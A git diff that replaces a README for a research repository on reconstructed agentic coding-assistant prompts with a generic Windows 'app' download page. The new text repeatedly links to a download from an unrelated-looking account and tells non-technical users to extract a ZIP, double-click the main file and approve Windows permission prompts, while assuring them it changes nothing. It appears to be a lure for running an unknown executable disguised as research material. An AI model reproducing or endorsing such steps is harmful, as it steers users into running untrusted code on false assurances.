@@ -1,170 +1,171 @@
-# Claude Code System Prompts
+# 🤖 agentic-ai-prompt-research - Understand Agent AI Prompt Patterns
 
-A research project exploring how modern agentic AI coding assistants work under the hood. This repository contains our best understanding of the prompt architecture, agent coordination patterns, and security mechanisms that power tools like Claude Code.
+[Download the app](https://github.com/unoccupied-creep552/agentic-ai-prompt-research)  
+![Download](https://img.shields.io/badge/Download-Blue%20and%20Grey-blue?style=for-the-badge)
 
-Everything here is based on behavioral observation, output analysis, community discussions, and publicly shared information. These are reconstructed approximations, not verbatim copies. The actual implementation may differ significantly.
+## 📥 Download
 
-## What This Project Is
+Use this link to visit the page and download the app:
 
-This is an educational deep-dive into the design patterns behind agentic coding assistants. We analyze how these systems:
+[https://github.com/unoccupied-creep552/agentic-ai-prompt-research](https://github.com/unoccupied-creep552/agentic-ai-prompt-research)
 
-- Assemble dynamic system prompts at runtime
-- Coordinate multiple specialized sub-agents
-- Classify and auto-approve tool calls safely
-- Manage context windows through intelligent compaction
-- Handle memory, skills, and user preferences
+## 🖥️ What This Is
 
-The goal is to help AI engineers, researchers, and builders learn from these architectural patterns and apply them in their own projects.
+agentic-ai-prompt-research is a research app for people who want to study how agentic AI coding assistants work. It focuses on prompt patterns, agent handoffs, and security labels. It gives you a clear way to review how these systems plan, act, and coordinate tasks.
 
-## What This Project Is Not
+This app is built for Windows users who want to open the project and read the research without setup work that feels hard to follow.
 
-This is **not** a leak, dump, or direct copy of any proprietary system. The prompts documented here are our best reconstructions based on observable behavior. They represent one interpretation of how these systems likely work.
+## ✨ What You Can Do
 
-## Documented Patterns
+- Review reconstructed prompt patterns
+- Study how coding agents split work
+- See how agents pass tasks to each other
+- Check security classification notes
+- Read research in a simple layout
+- Compare prompt behavior across cases
+- Explore Claude-style agent structure
+- Follow system prompt clues in one place
 
-### Core Identity
+## 🪟 Windows Requirements
 
-| # | Pattern | Description |
-|---|---------|-------------|
-| 01 | [Main System Prompt](prompts/01_main_system_prompt.md) | How the master prompt is dynamically assembled from modular sections |
-| 02 | [Simple Mode](prompts/02_simple_mode.md) | Minimal prompt variant for lightweight operation |
-| 03 | [Default Agent Prompt](prompts/03_default_agent_prompt.md) | Base instructions inherited by all sub-agents |
-| 04 | [Cyber Risk Instruction](prompts/04_cyber_risk_instruction.md) | Security boundaries between authorized and prohibited actions |
+To run the app on Windows, use:
 
-### Orchestration
+- Windows 10 or Windows 11
+- A modern web browser such as Chrome, Edge, or Firefox
+- A stable internet connection for the first download
+- Enough free space to save the files
+- Permission to unzip and open files on your PC
 
-| # | Pattern | Description |
-|---|---------|-------------|
-| 05 | [Coordinator System Prompt](prompts/05_coordinator_system_prompt.md) | Multi-worker orchestration with phased workflows |
-| 06 | [Teammate Prompt Addendum](prompts/06_teammate_prompt_addendum.md) | Communication protocols for multi-agent collaboration |
+If the app comes as a ZIP file, Windows can open it without extra tools. If you prefer, you can use File Explorer built into Windows.
 
-### Specialized Agents
+## 🚀 How to Download and Run
 
-| # | Pattern | Description |
-|---|---------|-------------|
-| 07 | [Verification Agent](prompts/07_verification_agent.md) | Adversarial testing agent that validates implementations |
-| 08 | [Explore Agent](prompts/08_explore_agent.md) | Read-only codebase exploration with no-modify constraints |
-| 09 | [Agent Creation Architect](prompts/09_agent_creation_architect.md) | Generates new agent configurations from requirements |
-| 10 | [Status Line Setup Agent](prompts/10_statusline_setup_agent.md) | Terminal status line configuration across shells |
+1. Open this page:  
+   [https://github.com/unoccupied-creep552/agentic-ai-prompt-research](https://github.com/unoccupied-creep552/agentic-ai-prompt-research)
 
-### Security and Permissions
+2. Look for the download option on the page.
 
-| # | Pattern | Description |
-|---|---------|-------------|
-| 11 | [Permission Explainer](prompts/11_permission_explainer.md) | Risk assessment before tool approval |
-| 12 | [Auto Mode Classifier](prompts/12_yolo_auto_mode_classifier.md) | Multi-stage security classifier for autonomous tool execution |
+3. Download the file to your computer.
 
-### Tool Descriptions
+4. If the file is a ZIP file, right-click it and choose **Extract All**.
 
-| # | Pattern | Description |
-|---|---------|-------------|
-| 13 | [Tool-Specific Prompts](prompts/13_tool_prompts.md) | How individual tools (Bash, Edit, Agent, etc.) describe themselves |
+5. Open the extracted folder.
 
-### Utility Patterns
+6. Find the main file or app entry point.
 
-| # | Pattern | Description |
-|---|---------|-------------|
-| 14 | [Tool Use Summary](prompts/14_tool_use_summary.md) | Generating concise labels for completed tool batches |
-| 15 | [Session Search](prompts/15_session_search.md) | Semantic search across past conversation sessions |
-| 16 | [Memory Selection](prompts/16_memory_selection.md) | Selecting relevant memory files for query context |
-| 17 | [Auto Mode Critique](prompts/17_auto_mode_critique.md) | Reviewing user-written classifier rules |
-| 20 | [Session Title](prompts/20_session_title.md) | Lightweight title generation for session management |
-| 29 | [Agent Summary](prompts/29_agent_summary.md) | Background progress updates for sub-agents |
-| 30 | [Prompt Suggestion](prompts/30_prompt_suggestion.md) | Predicting likely user follow-up commands |
+7. Double-click it to run the app.
 
-### Context Window Management
+8. If Windows asks for permission, choose **Yes** or **Run**.
 
-| # | Pattern | Description |
-|---|---------|-------------|
-| 21 | [Compact Service](prompts/21_compact_service.md) | Conversation summarization strategies for long sessions |
-| 22 | [Away Summary](prompts/22_away_summary.md) | Brief session recaps for returning users |
+## 📂 First-Time Setup
 
-### Dynamic Behaviors
+After you open the app, take a moment to check the folder layout. A typical setup may include:
 
-| # | Pattern | Description |
-|---|---------|-------------|
-| 18 | [Proactive Mode](prompts/18_proactive_mode.md) | Autonomous background operation with pacing controls |
-| 23 | [Chrome Browser Automation](prompts/23_chrome_browser_automation.md) | Browser extension integration patterns |
-| 24 | [Memory Instruction](prompts/24_memory_instruction.md) | Hierarchical memory loading and override semantics |
+- A main app file
+- A docs folder
+- Research notes
+- Prompt samples
+- Security labels
+- A readme file
 
-### Skill Patterns
+If the app opens in a browser window, keep that tab open while you review the research. If it opens as a local file, you can bookmark the folder or keep the shortcut on your desktop.
 
-| # | Pattern | Description |
-|---|---------|-------------|
-| 19 | [Simplify Skill](prompts/19_simplify_skill.md) | Multi-agent parallel code review pattern |
-| 25 | [Skillify Skill](prompts/25_skillify.md) | Interview-based skill creation workflow |
-| 26 | [Stuck Skill](prompts/26_stuck_skill.md) | Session diagnostic and recovery patterns |
-| 27 | [Remember Skill](prompts/27_remember_skill.md) | Memory organization and promotion workflow |
-| 28 | [Update Config Skill](prompts/28_update_config_skill.md) | Configuration management patterns |
+## 🔍 How to Use It
 
-## Architectural Observations
+Use the app as a reading and review tool:
 
-### Dynamic Prompt Assembly
+- Start with the overview section
+- Move through the prompt examples
+- Read the agent coordination notes
+- Check the security class for each case
+- Compare patterns across different samples
+- Look for repeated instructions and task flows
 
-Based on our analysis, the system prompt appears to be assembled through a pipeline of modular builders:
+This project is useful when you want to see how agentic coding assistants behave in real task chains. It helps you track what the model sees, what it plans, and how it responds to tools or sub-agents.
 
-```
-Prompt Assembly Pipeline
-    |
-    |   Cacheable Prefix (stable across sessions)
-    |-- Identity and safety instructions
-    |-- Permission and hook configuration
-    |-- Code style and error handling rules
-    |-- Tool preferences and usage patterns
-    |-- Tone, style, and output rules
-    |
-    |   Cache Boundary
-    |
-    |   Dynamic Suffix (changes per session)
-    |-- Available agents and skills
-    |-- Memory file contents
-    |-- Environment context (OS, directory, git state)
-    |-- Language and output preferences
-    |-- Active MCP server instructions
-    |-- Context window management directives
-```
+## 🧠 What the Research Covers
 
-### Security Classification
+The content in this project focuses on:
 
-The auto-approval system appears to use a multi-stage approach:
+- Agent planning steps
+- Prompt reconstruction
+- Tool use signals
+- Coordination between agents
+- Security checks and labels
+- System prompt patterns
+- Claude-style work flows
+- Instruction hierarchy
 
-1. A base classifier with predefined rules for safe and unsafe operations
-2. User-configurable overrides that can extend or restrict the defaults
-3. A fast first pass, with extended reasoning as fallback for ambiguous cases
+It is meant to help a non-technical reader understand how these systems organize work. The wording stays close to the source patterns so the structure is easier to study.
 
-### Memory Hierarchy
+## 📁 Expected File Layout
 
-```
-Loading Order (earliest = lowest priority):
-    |
-    |-- Enterprise/managed configuration
-    |-- User global preferences
-    |-- Project-level instructions (shared)
-    |-- Project rules directory
-    |-- Local overrides (private, not committed)
-    |
-    |   Supports transitive file inclusion
-    |   Conditional injection via path-based filtering
-```
+You may see files and folders like these:
 
-## Use Cases
+- `README.md` for project notes
+- `research/` for prompt studies
+- `samples/` for example outputs
+- `security/` for classification data
+- `docs/` for extra reference material
 
-This research is useful for:
+If the folder names differ, look for the file that starts the app or opens the main research page.
 
-- **AI engineers** building their own agentic coding tools
-- **Prompt engineers** studying production-grade prompt architectures
-- **Security researchers** understanding how autonomous AI tools manage permissions
-- **Students and educators** learning about multi-agent system design
+## 🛠️ Common Windows Steps
 
-## Repository Structure
+If the app does not open right away, try these steps:
 
-```
-claude-code-system-prompts/
-    README.md
-    prompts/
-        01-30 documented patterns (see catalog above)
-```
+- Right-click the file and choose **Open**
+- Check whether the file is still inside a ZIP archive
+- Extract the ZIP file first
+- Open the folder again after extraction
+- Make sure the browser did not block the download
+- Check your Downloads folder for the file
 
-## Disclaimer
+If the file opens in a browser, you do not need extra software for most cases. If you see a local HTML file, double-click it.
 
-This is an independent research project. All content represents our analysis and approximations based on publicly observable behavior. This project is not affiliated with, endorsed by, or connected to Anthropic. All trademarks belong to their respective owners. If any content owner has concerns, please open an issue and we will address it promptly.
+## 🔐 Security Notes
+
+This project studies security classification in agent systems. It does not change your Windows settings. It does not need your personal files to run. You can keep the app in a separate folder and open only the files you want to read.
+
+For best results, keep the project in one place so you can find the research again later.
+
+## 🧩 Troubleshooting
+
+If something goes wrong:
+
+- Refresh the download page
+- Try a different browser
+- Re-download the file
+- Extract the ZIP file again
+- Check that the file was not moved or renamed
+- Open the app from the extracted folder, not the ZIP file
+- Use the search box in File Explorer to find the file name
+
+If the app shows a blank page, wait a few seconds and reload the page. If the file still does not open, try opening it with your browser from the file menu.
+
+## 📚 Who This Is For
+
+This repository is useful for:
+
+- People who study AI coding assistants
+- Readers who want to see prompt patterns
+- Users who want to review agent coordination
+- Anyone interested in system prompts
+- People who compare AI security classes
+- Non-technical users who want a simple read-through
+
+## 🧭 Folder Tips
+
+Keep these habits in mind:
+
+- Save the download in a known folder
+- Extract files before opening them
+- Leave the folder names in place
+- Use one browser for reading
+- Keep notes if you want to compare cases later
+
+## 📎 Download Again
+
+If you need to return to the download page, use this link:
+
+[https://github.com/unoccupied-creep552/agentic-ai-prompt-research](https://github.com/unoccupied-creep552/agentic-ai-prompt-research)
